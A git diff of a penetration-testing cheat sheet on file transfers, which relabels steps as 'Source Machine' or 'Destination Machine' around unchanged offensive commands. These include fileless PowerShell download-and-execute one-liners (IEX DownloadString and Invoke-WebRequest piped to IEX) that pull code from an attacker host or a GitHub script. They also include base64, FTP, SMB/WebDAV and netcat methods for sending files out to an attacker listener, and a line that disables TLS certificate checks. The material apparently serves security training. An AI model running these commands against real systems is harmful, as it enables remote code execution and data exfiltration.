@@ -15,7 +15,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><h4>PowerShell DownloadFile Method</h4></summary>
 
-**Sync (Wait for the download to finish)**  
+**Destination Machine: Sync (Wait for the download to finish)**  
 
 No password
 ```powershell
@@ -26,7 +26,7 @@ Using Credentials
 (New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
-**Async (Keep using Powershell while downloading)**  
+**Destination Machine: Async (Keep using Powershell while downloading)**  
 
 No password
 ```powershell
@@ -41,12 +41,12 @@ Using Credentials
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>
 
-Default  
+**Destination Machine: Default**  
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
 ```
 
-Pipeline input  
+**Destination Machine: Pipeline input**  
 ```powershell
 (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | IEX
 ```
@@ -54,17 +54,17 @@ Pipeline input
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h4>PowerShell Invoke-WebRequest</h4></summary>
 
-Default  
+**Destination Machine: Default**  
 ```powershell
 Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <OUTPUT FILE>
 ```
 
-ByPass Internet Explorer Error  
+**Destination Machine: ByPass Internet Explorer Error**  
 ```powershell
 Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
 ```
 
-ByPass SSL/TLS Error  
+**Destination Machine: ByPass SSL/TLS Error**  
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
@@ -126,18 +126,18 @@ net use n: /delete /y
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>FTP Downloads</h3></summary>  
 
-Setting up a Python3 FTP Server in Linux
+**Source Machine: Setting up a Python3 FTP Server in Linux**
 ```bash
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21 --user ftpuser --password 'ftppass'
 ```
 
-**Option 1: Download file using Powershell**
+**Destination Machine: Download file using Powershell**
 ```powershell
 (New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('ftpuser', 'ftppass')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
-**Option 2: Download file using CMD**  
+**Destination Machine: Download file using CMD**  
 ```cmd
 (
   echo open <IP>
@@ -159,7 +159,7 @@ ftp -i -v -n -s:ftpcommand.txt
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Base64 Encode & Decode</h4></summary>  
 
-1. Encode File Using PowerShell 
+**Source Machine: Encode File Using PowerShell** 
 ```powershell
 # 1. Convert File to Base64
 [Convert]::ToBase64String((Get-Content -path "<FILE PATH>" -Encoding byte))
@@ -169,7 +169,7 @@ Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
 ```
 We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.  
 
-2. Decode Base64 String in Linux
+**Destination Machine: Decode Base64 String in Linux**
 ```bash
 # 1. Save the base64 string to a file
 echo "<BASE64STRING>" > encoded.b64
@@ -184,12 +184,13 @@ md5sum decoded.txt
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Web Uploads</h4></summary>  
 
-1. Installing a Configured WebServer with Upload in Linux
+**Source Machine: Installing a Configured WebServer with Upload in Linux**
 ```bash
 pip3 install uploadserver
 python3 -m uploadserver
 ```
-2. PowerShell Script to Upload a File to Python Upload Server
+
+**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
@@ -199,16 +200,18 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Base64 Web Upload</h4></summary>  
 
-1. We use Netcat to listen in on a port we specify and send the file as a POST request.
+**Source Machine: We use Netcat to listen in on a port we specify and send the file as a POST request.**
 ```bash
 nc -lvnp <PORT>
 ```
-2. PowerShell Script to Upload a File to Python Upload Server
+
+**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
 ```powershell
 $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
 Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
 ```
-3. We copy the output and use the base64 decode function to convert the base64 string into a file.
+
+**Source Machine: We copy the output and use the base64 decode function to convert the base64 string into a file.**
 ```bash
 echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 ```
@@ -217,12 +220,13 @@ echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><h3>SMB Uploads</h3></summary>  
 
-1. Installing WebDav Python modules in Linux
+**Source Machine: Installing WebDav Python modules in Linux**
 ```bash
 sudo pip3 install wsgidav cheroot
 sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
 ```
-2. Uploading Files using SMB in Windows
+
+**Destination Machine: Uploading Files using SMB in Windows**
 ```cmd
 # DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
 dir \\192.168.49.128\DavWWWRoot
@@ -236,16 +240,18 @@ If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the s
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><h3>FTP Uploads</h3></summary>  
 
-**1. Start our FTP Server in Linux**
+**Source Machine: Start our FTP Server in Linux**
 ```bash
 sudo python3 -m pyftpdlib --port 21 --write
 ```
-**2. Upload the file in Windows**
+
+**Destination Machine: Upload the file in Windows**
 
 Option 1: Upload file using Powershell
 ```cmd
 (New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
 ```
+
 Option 2: Create a Command File for the FTP Client to Upload a File
 Create a Command File for the FTP Client and Download the Target File
 ```cmd
@@ -256,7 +262,8 @@ echo PUT <FILE PATH> >> ftpcommand.txt
 echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
-Once in FTP...
+
+**Destination Machine: Once in FTP...**
 ```cmd
 USER anonymous
 PUT <FILE PATH>
